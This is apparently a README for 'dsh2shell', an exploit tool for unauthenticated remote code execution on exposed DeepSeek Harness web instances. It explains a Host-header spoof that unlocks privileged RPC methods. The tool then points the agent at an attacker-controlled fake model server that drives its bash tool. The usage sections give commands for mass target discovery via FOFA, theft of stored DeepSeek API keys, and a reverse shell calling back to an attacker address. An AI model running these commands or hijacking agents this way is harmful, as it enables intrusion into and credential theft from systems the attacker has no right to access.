# dsh2shell

![demo](image.png)

Unauthenticated RCE PoC for exposed DeepSeek Harness (dsh) web instances.

**Principle**: spoofing the `Host` header unlocks dsh's privileged RPC methods, which lets the PoC point the target's LLM provider at its own built-in fake model server and drive the agent's bash tool with deterministic tool calls — no real model or valid API key needed.

## Requirements

- Python 3.8+ (stdlib only)
- A listener address reachable **from the target** (e.g. your VPS public IP)

## Usage

FOFA inventory and passive probing:

```sh
export FOFA_KEY='<FOFA_API_KEY>'
python3 dsh2shell.py --fofa
```

Read dsh-scoped DeepSeek keys:

```sh
python3 dsh2shell.py -t https://target.example.com --get-sk --insecure
```

Open an interactive PTY:

```sh
python3 dsh2shell.py -t https://target.example.com --shell \
    --lhost 1.2.3.4 --insecure --raw
```

Options:

| Option | Meaning |
|---|---|
| `--fofa` | FOFA inventory and passive dsh/API probe |
| `--get-sk` | Read dsh credential files and `DEEPSEEK_API_KEY` |
| `--shell` | Open a reverse shell against one explicit target |
| `-t, --target URL` | Explicit target URL |
| `--lhost address` | Callback address reachable from the target |
| `--shell-port port` | Reverse-shell port (default `4444`) |
| `--llm-listen host:port` | Fake-LLM bind address (default `0.0.0.0:9999`) |
| `--public-base URL` | Fake-LLM `/v1` URL as seen from the target |
| `--insecure` | Disable TLS certificate verification |
| `--raw` | Use a raw local TTY; `Ctrl-]` closes the client |

Target settings and temporary credentials are restored on exit. FOFA results are never passed automatically to exploit modes.

For authorized security testing only.
